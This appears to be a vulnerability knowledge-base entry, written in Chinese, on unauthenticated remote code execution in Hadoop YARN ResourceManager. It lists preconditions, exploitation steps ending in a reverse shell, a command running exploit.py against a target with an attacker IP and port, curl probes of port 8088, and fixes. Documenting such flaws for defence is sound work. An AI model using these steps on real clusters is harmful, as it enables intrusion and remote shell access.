---
id: HADOOP-UNAUTHORIZED-YARN
title: Hadoop YARN ResourceManager 未授权RCE漏洞
product: hadoop
vendor: Apache
version_affected: "全版本"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Hadoop", "YARN", "ResourceManager"]
---

## 漏洞描述

Hadoop YARN ResourceManager 存在未授权访问漏洞。未经授权的用户可以通过 REST API 提交并执行任意应用程序，实现命令执行。

## 影响版本

- Hadoop 全版本

## 前置条件

- 无需认证
- YARN ResourceManager Web UI 可访问（默认端口 8088）

## 利用步骤

1. 调用 New Application API 创建应用程序
2. 调用 Submit Application API 提交恶意应用程序
3. 获取反弹 shell

## Payload

```python
# 使用 exploit.py 脚本
python exploit.py <target_ip> <attacker_ip> <attacker_port>
```

## 验证方法

```bash
# 检查是否能访问 YARN UI
curl "http://target:8088/cluster"

# 直接提交任务测试
curl -X POST "http://target:8088/ws/v1/cluster/apps/new-application"
```

## 修复建议

1. 启用 Hadoop 认证机制（Kerberos）
2. 限制 YARN ResourceManager 的访问来源
3. 禁用未经授权的 REST API 访问
